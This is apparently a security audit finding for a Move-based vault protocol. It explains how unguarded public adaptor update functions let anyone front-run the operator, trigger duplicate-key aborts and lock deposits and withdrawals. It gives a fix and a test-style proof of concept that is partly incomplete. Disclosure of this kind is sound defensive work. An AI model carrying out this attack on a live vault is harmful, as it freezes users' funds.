# Audit Report

## Title
Missing Access Control in Adaptor Value Update Functions Allows DoS and Operation Value Tracking Bypass

## Summary
All adaptor value update functions are `public fun` without operator capability requirements, enabling any attacker to front-run the operator during vault operations and mark assets as "updated" in the operation tracking table. This causes the operator's legitimate update calls to abort with duplicate key errors, permanently locking the vault in `VAULT_DURING_OPERATION_STATUS` with no admin recovery mechanism.

## Finding Description

The vulnerability stems from a complete lack of access control on adaptor value update functions. All adaptor modules declare their update functions as `public fun` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) . Since the Vault is a shared object [6](#0-5)  and OracleConfig is also shared [7](#0-6) , these functions can be called by any external account via Programmable Transaction Blocks (PTBs).

These adaptor functions call `finish_update_asset_value` [8](#0-7) , which during vault operations attempts to add the asset type to the `asset_types_updated` table [9](#0-8) . The critical flaw is that `Table::add()` aborts if the key already exists, and there is no operator capability check in `finish_update_asset_value` [10](#0-9) .

**Attack Flow:**

1. Operator calls `start_op_with_bag`, which borrows assets and records them in `asset_types_borrowed` [11](#0-10) , sets vault status to `VAULT_DURING_OPERATION_STATUS` [12](#0-11) 

2. Operator calls `end_op_with_bag`, which enables value updates [13](#0-12) 

3. **Attack Window:** Attacker front-runs operator's value update PTB by calling adaptor update functions, adding assets to `asset_types_updated` table

4. Operator's legitimate update calls abort at `Table::add()` due to duplicate keys

5. Vault stuck: Cannot complete operation because `check_op_value_update_record` requires all assets marked as updated [14](#0-13) , but operator cannot re-update due to duplicates

6. No recovery: Admin's `set_enabled` function explicitly prevents status changes when vault is during operation [15](#0-14) 

The only validation in `finish_update_asset_value` is `assert_enabled()` [16](#0-15) , which only checks that status is not `VAULT_DISABLED_STATUS` [17](#0-16) , allowing operations during `VAULT_DURING_OPERATION_STATUS`.

## Impact Explanation

**Critical Denial of Service:**
- Vault becomes permanently stuck in `VAULT_DURING_OPERATION_STATUS`
- All user deposits abort due to `assert_normal()` requirement [18](#0-17) 
- All user withdrawals abort due to `assert_normal()` requirement [19](#0-18) 
- No new operations can start due to `assert_normal()` in `pre_vault_check` [20](#0-19) 
- Requires protocol upgrade or contract redeployment to recover

**Loss Tolerance Bypass:**
- Attacker updates asset values with arbitrary timestamps, potentially using stale oracle prices
- Validation in `check_op_value_update_record` only verifies assets are marked updated, not who updated them or value correctness
- This allows manipulation of `total_usd_value` calculations used in loss tolerance enforcement

**Affected Parties:** All vault users lose access to deposits and withdrawals; protocol operations completely halted.

## Likelihood Explanation

**High Probability:**
- **Reachability:** Functions are `public fun` callable via PTB with shared objects
- **Attack Complexity:** Low - attacker monitors `OperationStarted` events to identify borrowed assets, then front-runs with higher gas
- **Prerequisites:** Only requires vault to be in active operation (occurs regularly for yield optimization)
- **Attack Cost:** Minimal (only transaction gas fees)
- **No Authentication:** No operator capability or access control checks
- **Attack Window:** Several blocks between `end_op_with_bag` and operator's value updates

The attack is economically rational: minimal cost to cause complete protocol DoS affecting potentially millions in TVL, enabling griefing, competitor sabotage, or manipulation for external positions.

## Recommendation

Add operator capability checks to all adaptor update functions and `finish_update_asset_value`:

```move
public fun update_receipt_value<PrincipalCoinType, PrincipalCoinTypeB>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    receipt_vault: &Vault<PrincipalCoinTypeB>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
) {
    vault::assert_operator_not_freezed(operation, cap);
    // existing logic...
}

public(package) fun finish_update_asset_value<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    usd_value: u256,
    now: u64,
    require_operator: bool,
) {
    self.check_version();
    self.assert_enabled();
    
    if (require_operator && self.status() == VAULT_DURING_OPERATION_STATUS) {
        // Require operator cap validation upstream
    };
    
    // existing logic...
}
```

Additionally, implement idempotent updates using `Table::contains()` check before `add()`, or use `upsert` pattern to handle duplicate updates gracefully.

## Proof of Concept

```move
#[test]
fun test_dos_via_front_running_value_update() {
    // Setup vault, operator, and attacker accounts
    let mut scenario = test_scenario::begin(@operator);
    
    // 1. Operator starts operation (Phase 1)
    test_scenario::next_tx(&mut scenario, @operator);
    {
        let mut vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        let op = test_scenario::take_shared<Operation>(&scenario);
        let cap = test_scenario::take_from_sender<OperatorCap>(&scenario);
        let clock = test_scenario::take_shared<Clock>(&scenario);
        
        // Start operation with borrowed assets
        let (bag, tx, tx_check, principal, coin) = vault.start_op_with_bag(
            &op, &cap, &clock, 
            vector[1], // defi_asset_ids  
            vector[type_name::get<Receipt>()], // defi_asset_types
            0, 0, test_scenario::ctx(&mut scenario)
        );
        
        // 2. Operator ends operation (Phase 2) - enables value updates
        vault.end_op_with_bag(&op, &cap, bag, tx, principal, coin);
        
        test_scenario::return_shared(vault);
        // ... return other objects
    };
    
    // 3. ATTACKER front-runs operator's value update
    test_scenario::next_tx(&mut scenario, @attacker);
    {
        let mut vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        let receipt_vault = test_scenario::take_shared<Vault<USDC>>(&scenario);
        let config = test_scenario::take_shared<OracleConfig>(&scenario);
        let clock = test_scenario::take_shared<Clock>(&scenario);
        
        // Attacker calls update function WITHOUT operator cap
        receipt_adaptor::update_receipt_value(
            &mut vault,
            &receipt_vault,
            &config,
            &clock,
            asset_type_string
        );
        
        test_scenario::return_shared(vault);
        // ... return other objects
    };
    
    // 4. Operator's legitimate update call ABORTS
    test_scenario::next_tx(&mut scenario, @operator);
    {
        let mut vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        let receipt_vault = test_scenario::take_shared<Vault<USDC>>(&scenario);
        let config = test_scenario::take_shared<OracleConfig>(&scenario);
        let clock = test_scenario::take_shared<Clock>(&scenario);
        
        // This will ABORT with duplicate key error
        receipt_adaptor::update_receipt_value(
            &mut vault,
            &receipt_vault,
            &config,
            &clock,
            asset_type_string
        ); // ABORTS HERE
        
        test_scenario::return_shared(vault);
    };
    
    // 5. Vault is stuck - cannot complete operation
    test_scenario::next_tx(&mut scenario, @operator);
    {
        let vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        assert!(vault.status() == VAULT_DURING_OPERATION_STATUS, 0); // STUCK
        
        // Cannot enable/disable vault
        // Cannot accept deposits/withdrawals  
        // Requires contract upgrade to recover
        
        test_scenario::return_shared(vault);
    };
    
    test_scenario::end(scenario);
}
```

### Citations

**File:** volo-vault/sources/adaptors/receipt_adaptor.move (L16-16)
```text
public fun update_receipt_value<PrincipalCoinType, PrincipalCoinTypeB>(
```

**File:** volo-vault/sources/adaptors/receipt_adaptor.move (L35-35)
```text
    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
```

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L13-13)
```text
public fun update_navi_position_value<PrincipalCoinType>(
```

**File:** volo-vault/sources/adaptors/cetus_adaptor.move (L19-19)
```text
public fun update_cetus_position_value<PrincipalCoinType, CoinA, CoinB>(
```

**File:** volo-vault/sources/adaptors/suilend_adaptor.move (L23-23)
```text
public fun update_suilend_position_value<PrincipalCoinType, ObligationType>(
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L21-21)
```text
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
```

**File:** volo-vault/sources/volo_vault.move (L456-456)
```text
    transfer::share_object(vault);
```

**File:** volo-vault/sources/volo_vault.move (L523-523)
```text
    assert!(self.status() != VAULT_DURING_OPERATION_STATUS, ERR_VAULT_DURING_OPERATION);
```

**File:** volo-vault/sources/volo_vault.move (L645-646)
```text
public(package) fun assert_enabled<PrincipalCoinType>(self: &Vault<PrincipalCoinType>) {
    assert!(self.status() != VAULT_DISABLED_STATUS, ERR_VAULT_NOT_ENABLED);
```

**File:** volo-vault/sources/volo_vault.move (L728-728)
```text

```

**File:** volo-vault/sources/volo_vault.move (L905-905)
```text
    self.assert_normal();
```

**File:** volo-vault/sources/volo_vault.move (L1174-1203)
```text
public(package) fun finish_update_asset_value<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    usd_value: u256,
    now: u64,
) {
    self.check_version();
    self.assert_enabled();

    let last_update_time = &mut self.assets_value_updated[asset_type];
    *last_update_time = now;

    let position_value = &mut self.assets_value[asset_type];
    *position_value = usd_value;

    if (
        self.status() == VAULT_DURING_OPERATION_STATUS 
        && self.op_value_update_record.value_update_enabled 
        && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
    ) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    };

    emit(AssetValueUpdated {
        vault_id: self.vault_id(),
        asset_type: asset_type,
        usd_value: usd_value,
        timestamp: now,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L1206-1219)
```text
public(package) fun check_op_value_update_record<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
) {
    self.check_version();
    self.assert_enabled();
    assert!(self.op_value_update_record.value_update_enabled, ERR_OP_VALUE_UPDATE_NOT_ENABLED);

    let record = &self.op_value_update_record;

    record.asset_types_borrowed.do_ref!(|asset_type| {
        assert!(record.asset_types_updated.contains(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
        assert!(*record.asset_types_updated.borrow(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L1424-1425)
```text
    if (self.status() == VAULT_DURING_OPERATION_STATUS) {
        self.op_value_update_record.asset_types_borrowed.push_back(asset_type);
```

**File:** volo-vault/sources/oracle.move (L93-93)
```text
    transfer::share_object(config);
```

**File:** volo-vault/sources/operation.move (L73-73)
```text
    vault.assert_normal();
```

**File:** volo-vault/sources/operation.move (L74-74)
```text
    vault.set_status(VAULT_DURING_OPERATION_STATUS);
```

**File:** volo-vault/sources/operation.move (L294-294)
```text
    vault.enable_op_value_update();
```
